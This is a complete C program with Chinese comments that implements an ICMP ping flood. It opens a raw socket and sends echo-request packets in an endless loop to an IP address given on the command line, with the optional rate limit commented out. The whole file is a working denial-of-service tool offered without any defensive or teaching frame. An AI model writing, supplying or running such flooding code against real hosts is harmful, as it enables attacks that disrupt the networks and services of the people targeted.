#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <time.h>

// 計算 ICMP checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// 發送 ICMP 封包（無限迴圈用以產生大量封包）
void send_flood_ping(const char *ip_addr) {
    int sockfd;
    struct sockaddr_in addr;
    struct icmp icmp_pkt;
    int seq = 0;

    // 建立 socket
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // 設置目標地址
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_addr);

    printf("Starting ICMP flood to %s...\n", ip_addr);

    while (1) {  // 無限迴圈發送封包
        // 填 ICMP 封包內容
        memset(&icmp_pkt, 0, sizeof(icmp_pkt));
        icmp_pkt.icmp_type = ICMP_ECHO;  // Number 8
        icmp_pkt.icmp_code = 0;
        icmp_pkt.icmp_id = getpid() & 0xFFFF;  // 使用Process ID
        icmp_pkt.icmp_seq = seq++;  // Sequence Number遞增 使每包都有不一樣的效果
        icmp_pkt.icmp_cksum = checksum(&icmp_pkt, sizeof(icmp_pkt));

        // 發送封包
        if (sendto(sockfd, &icmp_pkt, sizeof(icmp_pkt), 0, (struct sockaddr *)&addr, sizeof(addr)) <= 0) {
            perror("Send failed");
            break;
        }

        // Optional：降低 CPU 使用率（調整速率）
        // usleep(1000);  // 1ms 間隔 (每秒約1000個封包)

        // 記錄發送數量
        if (seq % 1000 == 0) {
            printf("Sent %d packets...\n", seq);
        }
    }

    close(sockfd);
}

// Main Function
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <IP>\n", argv[0]);
        return 1;
    }

    send_flood_ping(argv[1]);

    return 0;
}
